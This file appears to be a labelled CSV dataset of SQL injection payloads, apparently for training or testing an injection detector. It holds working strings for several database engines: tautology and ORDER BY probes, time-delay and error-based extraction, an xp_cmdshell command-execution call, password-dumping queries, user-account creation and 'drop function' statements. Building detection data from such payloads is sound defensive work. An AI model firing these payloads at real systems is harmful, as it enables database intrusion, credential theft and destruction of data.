label,payload,family
attack,t'exec master..xp_cmdshell 'nslookup www.google.com'--,other
attack,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,other
attack,", begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >",other
attack,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",other
attack,having 1  =  1--,other
attack,!,other
attack,sqlvuln,other
attack,declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,other
attack, or ''&',other
attack,declare @q nvarchar   (  4000  )   select @q   = ,other
attack,declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,other
attack,"admin"" #",other
attack,", begin declare @var varchar  (  8000  )   set @var  =  ' ...",other
attack,PRINT @@variable,other
attack,""" or """"-""",other
attack,"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ",other
attack, (  sqlattempt2  ) ,other
attack,@var select @var as var into temp end --,other
attack,",s",other
attack,t'exec master..xp_cmdshell 'nslookup www.googl ...,other
attack,or,other
attack,select,other
attack," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",other
attack,exec xp,other
attack, or ''*',other
attack,sqlattempt1,other
attack,order by,other
attack,//*,other
attack,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,other
attack, (  sqlvuln  ) ,other
attack,1 exec sp_   (  or exec xp_  ) ,other
attack,having,other
attack,replace,other
attack,"""^""",other
attack,limit,other
attack,create user name identified by 'pass123',other
attack,.s,other
attack,|,other
attack,1  )   as boed where 6787  =  6787,other
attack,"1"" where 4281  =  4281",other
attack,select   (  case when   (  7978  =  6009  )   then 7978 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   as ztkr where 1532  =  1532",other
attack, (  1589  =  1589  )  *1,other
attack,-5021'+  (  select yadq where 4285  =  4285 order by 1#,other
attack,1'  )   as rbpx where 1264  =  1264,other
attack,if  (  8284  =  6171  )   select 8284 else drop function mbih--,other
attack,"1"" where 6501  =  6501",other
attack,select case when 6558  =  4327 then 1 else null end--,other
attack,select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  #,other
attack,1'  )   where 4867  =  4867 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,other
attack,1%'  )   order by 1--,other
attack,"-9087"" order by 1#",other
attack,select   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  select 1275 from information_schema.character_sets  )   end  )  #,other
attack,"1""  )   as duvm where 6190  =  6190 order by 1--",other
attack,select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,other
attack,select case when 1574  =  5523 then 1 else null end--,other
attack,"1""   )    )    as uaxn where 5657  =  5657 rlike   (  select   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",other
attack,1'+  (  select 'ljtl' where 1766  =  1766,other
attack,1'  )   where 6622  =  6622 order by 1--,other
attack,"1'+  (  select 'yzxc' where 5230  =  5230   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",other
attack,select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,other
attack,1'||  (  select 'zyvk' from dual where 2072  =  2072,other
attack,-6637'   )    )    order by 1#,other
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",other
attack,1'   )    )    as eymg where 7000  =  7000,other
attack,"1',  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",other
attack,select   (  case when   (  9455  =  6007  )   then 9455 else 9455*  (  select 9455 from mysql.db  )   end  )  #,other
attack,"1""  )   where 6897  =  6897",other
attack,1%' order by 1#,other
attack,select   (  case when   (  6961  =  7460  )   then 1 else 6961*  (  select 6961 from master..sysdatabases  )   end  )  --,other
attack,select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --,other
attack,1  )   as gbtj where 8175  =  8175,other
attack,-9826 where 4103  =  4103 order by 1#,other
attack,1   )    )    as muyz where 6105  =  6105,other
attack,1  )   where 1402  =  1402,other
attack,1 where 9872  =  9872,other
attack,"1,  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",other
attack,select   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  select 5390 from mysql.db  )   end  )  #,other
attack,1  )   where 5774  =  5774,other
attack,select   (  case when   (  6615  =  3564  )   then 1 else 6615*  (  select 6615 from master..sysdatabases  )   end  )  --,other
attack,select   (  case when   (  9540  =  5786  )   then 9540 else 9540*  (  select 9540 from information_schema.character_sets  )   end  )  #,other
attack,select case when 7426  =  6635 then 1 else null end--,other
attack,"iif  (  3204  =  8489,3204,1/0  )  ",other
attack,"select count  (  *  )   from generate_series  (  1,5000000  )  #",other
attack,1'+  (  select 'cwta' where 6091  =  6091,other
attack,1  )   as bhdj where 4472  =  4472,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",other
attack,"1""   )    )    as mvxa where 3024  =  3024",other
attack,1' order by 1#,other
attack,"1"" where 8727  =  8727",other
attack,1'||  (  select 'jmao' where 3009  =  3009,other
attack,1'  )   as zxos where 2745  =  2745,other
attack,select   (  case when   (  6434  =  3877  )   then 6434 else 1/  (  select 0  )   end  )  --,other
attack,"1""   )    )    as rpxd where 4929  =  4929",other
attack,1   )    )    as mlpf where 7425  =  7425,other
attack,"1,  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",other
attack,1'||  (  select 'noik' from dual where 9851  =  9851,other
attack,select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,other
attack,1'  )   where 1363  =  1363,other
attack,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,other
attack,if  (  3831  =  9321  )   select 3831 else drop function ybru--,other
attack,"1""  )   where 9861  =  9861",other
attack,if  (  3490  =  4920  )   select 3490 else drop function hlzt--,other
attack,1 where 3354  =  3354,other
attack,1  )   where 2232  =  2232,other
attack,"iif  (  2452  =  8999,1,1/0  )  ",other
attack,1'||  (  select 'tvcy' where 5592  =  5592 order by 1#,other
attack,1  )   as oknr where 3228  =  3228,other
attack,select case when 1892  =  3646 then 1 else null end--,other
attack,"-7416"" where 7656  =  7656 order by 1--",other
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",other
attack,1  )   as mtda where 3951  =  3951,other
attack,"iif  (  9190  =  5059,1,1/0  )  ",other
attack, (  select chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7812  =  7812  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )   from dual  ) ,other
attack,1  )   where 7026  =  7026,other
attack,1'  )   as lewd where 3118  =  3118 order by 1--,other
attack,1'  )   as upgb where 2031  =  2031,other
attack,1'||  (  select 'omeg' from dual where 4751  =  4751,other
attack,1'||  (  select 'gved' from dual where 6965  =  6965,other
attack,-1765'  )   order by 1--,other
attack,select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,other
attack,"elt  (  5953  =  5953,1  )  ",other
attack,"1""   )    )    as brwj where 9180  =  9180",other
attack,-1277'   )    )     )   order by 1--,other
attack,select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,other
attack,"1""   )    )    as ufba where 4049  =  4049",other
attack,"1""  )   where 9447  =  9447",other
attack,"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,1'+  (  select ohqr where 5610  =  5610,other
attack,1 where 4641  =  4641,other
attack, (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,other
attack,-4607'||  (  select 'wkdg' where 7524  =  7524 order by 1--,other
attack,"1""   )    )    as tgwp where 9405  =  9405",other
attack,1 where 8506  =  8506,other
attack,1' where 7036  =  7036,other
attack,1'||  (  select 'goen' from dual where 8586  =  8586,other
attack,1'   )    )    as mqnv where 9831  =  9831,other
attack,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,other
attack,select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #,other
attack,1 where 1299  =  1299,other
attack,select   (  case when   (  9562  =  5996  )   then 1 else 9562*  (  select 9562 from master..sysdatabases  )   end  )  --,other
attack,"select * from generate_series  (  4592,4592,case when   (  4592  =  4592  )   then 1 else 0 end  )   limit 1--",other
attack,"iif  (  1157  =  4542,1,1/0  )  ",other
attack,"select * from generate_series  (  4465,4465,case when   (  4465  =  6232  )   then 1 else 0 end  )   limit 1--",other
attack,"-3964""  )   where 3566  =  3566 order by 1--",other
attack,1 order by 1--,other
attack,select   (  case when   (  8820  =  4648  )   then 8820 else 8820*  (  select 8820 from information_schema.character_sets  )   end  )  #,other
attack,"1""   )    )    as xxdm where 4818  =  4818",other
attack,select   (  case when   (  3365  =  6236  )   then 3365 else 1/  (  select 0  )   end  )  --,other
attack,1' where 9602  =  9602,other
attack,1'+  (  select iutk where 6158  =  6158,other
attack,1'||  (  select 'jlon' where 1461  =  1461,other
attack,select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #,other
attack,"select count  (  *  )   from generate_series  (  1,5000000  )  --",other
attack,end if,other
attack, (  case when 2646  =  8520 then 2646 else null end  ) ,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",other
attack,select case when 1613  =  2937 then 1 else null end--,other
attack, (  2329  =  4209  )  *1,other
attack,"1',  (  case when 5204  =  2136 then 1 else null end  )  ",other
attack,1 where 4844  =  4844,other
attack,1%'   )    )     )   order by 1#,other
attack,1' in boolean mode  )   order by 1--,other
attack,1'  )   where 3572  =  3572,other
attack,1' where 8128  =  8128,other
attack,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",other
attack,select   (  case when   (  4572  =  4086  )   then 1 else 4572*  (  select 4572 from master..sysdatabases  )   end  )  --,other
attack,1'   )    )    as dckd where 1794  =  1794,other
attack,"1"" where 8016  =  8016",other
attack,"1,  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",other
attack,select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --,other
attack,"1""  )   order by 1--",other
attack,-3497' order by 1#,other
attack,1'||  (  select 'xlmt' where 1664  =  1664,other
attack,1'   )    )     )   order by 1#,other
attack,"1"" where 9230  =  9230",other
attack,"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ",other
attack,1' where 4460  =  4460,other
attack,"1""  )   where 1793  =  1793",other
attack,1'+  (  select gqez where 3704  =  3704,other
attack,"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",other
attack,select case when 3076  =  1605 then 1 else null end--,other
attack,1' where 6116  =  6116,other
attack,1' where 1623  =  1623,other
attack,1 where 2060  =  2060,other
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",other
attack,1'  )   where 8429  =  8429,other
attack,"1"" where 1166  =  1166",other
attack,select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,other
attack,"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )   ",other
attack,1'||  (  select 'xhcr' from dual where 9279  =  9279,other
attack,1  )   where 2543  =  2543,other
attack,1'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,other
attack,-3688'||  (  select 'pber' from dual where 7137  =  7137 order by 1#,other
attack,"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",other
attack,"1,  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",other
attack,"iif  (  3760  =  4785,1,1/0  )  ",other
attack,1'||  (  select 'etvo' from dual where 1557  =  1557,other
attack,select   (  case when   (  4061  =  1396  )   then 4061 else 1/  (  select 0  )   end  )  --,other
attack,"1  )   where 5012  =  5012   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,1'  )   as mpsf where 3348  =  3348,other
attack,1'||  (  select 'glec' from dual where 4846  =  4846,other
attack,1  )   where 5442  =  5442,other
attack,1'  )   where 5871  =  5871,other
attack,1'+  (  select 'rsgi' where 2258  =  2258,other
attack,1'  )   where 9175  =  9175,other
attack,1'   )    )    as vuzt where 4971  =  4971,other
attack,"  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ",other
attack,"iif  (  5462  =  8866,1,1/0  )  ",other
attack,select   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  select 9732 from information_schema.character_sets  )   end  )  #,other
attack,select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,other
attack,1'   )    )    as xpmy where 5274  =  5274 rlike   (  select   (  case when   (  6252  =  7704  )   then 1 else 0x28 end   )    )   --,other
attack,"1""  )   where 6311  =  6311",other
attack,1'+  (  select taga where 8036  =  8036,other
attack,1'||  (  select 'cfff' where 4994  =  4994,other
attack,1'   )    )    as nhkp where 8030  =  8030,other
attack,1   )    )    as gygm where 4024  =  4024,other
attack,1'+  (  select ijoh where 7145  =  7145 order by 1--,other
attack,-8753  )   order by 1#,other
attack,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",other
attack,1'   )    )    as grne where 9003  =  9003 order by 1--,other
attack,"1""  )   as kndn where 9314  =  9314",other
attack,"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",other
attack,1'  )   as twny where 9580  =  9580,other
attack,"1""   )    )   ",other
attack,-2912'   )    )    order by 1--,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",other
attack,1'  )   where 4298  =  4298,other
attack,1  )   where 6494  =  6494,other
attack,"1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",other
attack,"1,iif  (  1440  =  4612,1,1/0  )  ",other
attack,1'+  (  select 'yjpp' where 8966  =  8966,other
attack,1'  )   where 1212  =  1212,other
attack,-4191  )   order by 1#,other
attack,1' order by 1--,other
attack,select case when 3920  =  4402 then 1 else null end--,other
attack,1'  )   where 9159  =  9159,other
attack,1'  )   where 2928  =  2928,other
attack,"1""   )    )    as ajwe where 1153  =  1153 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",other
attack,select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,other
attack,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,other
attack,"1',  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   ",other
attack,-4057'  )   order by 1#,other
attack,1'+  (  select 'mxlb' where 4900  =  4900,other
attack,"1"" where 2452  =  2452",other
attack,-3084%'   )    )    order by 1--,other
attack,1'   )    )    order by 1#,other
attack,"1%""  )   order by 1#",other
attack,"-6803""  )   order by 1#",other
attack,"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",other
attack,select case when 7951  =  1147 then 1 else null end--,other
attack,1'   )    )    as qqvk where 1007  =  1007,other
attack,"  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",other
attack,1' where 2673  =  2673,other
attack,"make_set  (  7729  =  7729,1  )  ",other
attack,-9622'   )    )     )   order by 1#,other
attack,"1""   )    )    as sgln where 7573  =  7573",other
attack,"1""   )    )    as puws where 7006  =  7006",other
attack,if  (  9953  =  4347  )   select 9953 else drop function ocau--,other
attack,1 rlike   (  select   (  case when   (  6795  =  5898  )   then 1 else 0x28 end   )    )   -- xdkx,other
attack,1' where 9216  =  9216,other
attack,"1""  )   as giqb where 4664  =  4664",other
attack,select   (  case when   (  1946  =  1302  )   then 1946 else 1/  (  select 0  )   end  )  --,other
attack, (  case when 6398  =  6398 then 1 else null end  ) ,other
attack,1'+  (  select kfmv where 1679  =  1679,other
attack,1'  )   where 6305  =  6305 rlike   (  select   (  case when   (  8326  =  9749  )   then 1 else 0x28 end   )    )   --,other
attack,"1""   )    )    as chal where 6661  =  6661",other
attack,1'   )    )    as iipj where 6560  =  6560,other
attack,if  (  4735  =  8907  )   select 4735 else drop function qigo--,other
attack,"1""  )   as esks where 1138  =  1138",other
attack,select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,other
attack,-1621' in boolean mode  )   order by 1--,other
attack,"1""  )   as mibc where 3113  =  3113",other
attack,select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,other
attack,1'+  (  select tdkt where 4535  =  4535,other
attack,1'  )   where 5145  =  5145,other
attack,"1'  )   where 9951  =  9951   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,other
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",other
attack,select   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  select 8711 from master..sysdatabases  )   end  )  --,other
attack,1'   )    )    as pqbq where 1865  =  1865,other
attack,1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,"1"" where 1234  =  1234",other
attack, (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,other
attack,1' where 1557  =  1557,other
attack,"1',  (  case when 8260  =  8260 then 1 else null end  )  ",other
attack,"1"" where 8734  =  8734",other
attack,"1""  )   as tuem where 1328  =  1328",other
attack,"1""   )    )    as nwnp where 6140  =  6140",other
attack,select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --,other
attack,1'||  (  select 'brsr' where 5458  =  5458,other
attack,"iif  (  8214  =  4954,1,1/0  )  ",other
attack,"1"" where 9889  =  9889",other
attack,1 where 8393  =  8393,other
attack,1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,"1""   )    )    as itxo where 7916  =  7916",other
attack,1  )   as hvsk where 7902  =  7902,other
attack,1'  )   as bscn where 6907  =  6907,other
attack,1' where 2134  =  2134 rlike   (  select   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,other
attack,select   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  select 5009 from information_schema.character_sets  )   end  )  #,other
attack,-7426' order by 1#,other
attack,1  )   where 7552  =  7552 order by 1#,other
attack,-2174'   )    )    as zhoz where 4185  =  4185 order by 1#,other
attack,1'+  (  select soqk where 5383  =  5383,other
attack,1'   )    )    as vdhw where 8858  =  8858 order by 1#,other
attack,-5555   )    )    as ldte where 4583  =  4583 order by 1#,other
attack,1'||  (  select 'zccb' from dual where 8911  =  8911,other
attack,1 where 2382  =  2382,other
attack,"1""  )   where 5129  =  5129 order by 1--",other
attack,1 where 9404  =  9404,other
attack,1'  )   where 7252  =  7252,other
attack,1  )   as nsdy where 7513  =  7513,other
attack,"iif  (  8354  =  3515,1,1/0  )  ",other
attack,"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",other
attack,"1""  )   as rcnk where 1800  =  1800",other
attack, (  select 2412  =    (  'qqpjq'||  (  select case 2412 when 2412 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    ) ,other
attack,if  (  9431  =  6730  )   select 9431 else drop function xbkh--,other
attack,1'||  (  select 'hwdj' where 8179  =  8179,other
attack,1  )   as usnn where 3201  =  3201,other
attack,1'||  (  select 'yuku' where 7480  =  7480,other
attack,select case when 8975  =  2352 then 1 else null end--,other
attack,1'  )   where 4729  =  4729,other
attack,1'||  (  select 'fjlg' from dual where 9517  =  9517,other
attack,1 where 8398  =  8398,other
attack,select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,other
attack,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",other
attack,"1""  )   where 3679  =  3679",other
attack,select case when 9390  =  5752 then 1 else null end--,other
attack,select case when 4176  =  6138 then 1 else null end--,other
attack,"select * from generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   limit 1--",other
attack,1'  )   where 2763  =  2763,other
attack,"1"" where 8918  =  8918   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,1'+  (  select 'vnue' where 5807  =  5807,other
attack,"select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--",other
attack,1'||  (  select 'aioq' from dual where 8176  =  8176,other
attack,"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",other
attack,1' where 4388  =  4388,other
attack,1'+  (  select aqhj where 4419  =  4419,other
attack,select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,other
attack,1'||  (  select 'blvu' from dual where 9813  =  9813,other
attack,select   (  case when   (  3681  =  5026  )   then 3681 else 3681*  (  select 3681 from information_schema.character_sets  )   end  )  #,other
attack,"1""  )   where 4964  =  4964",other
attack,1   )    )    as trin where 8843  =  8843,other
attack,-8729'+  (  select 'nbzl' where 7160  =  7160 order by 1#,other
attack,1  )   as vqbf where 4020  =  4020,other
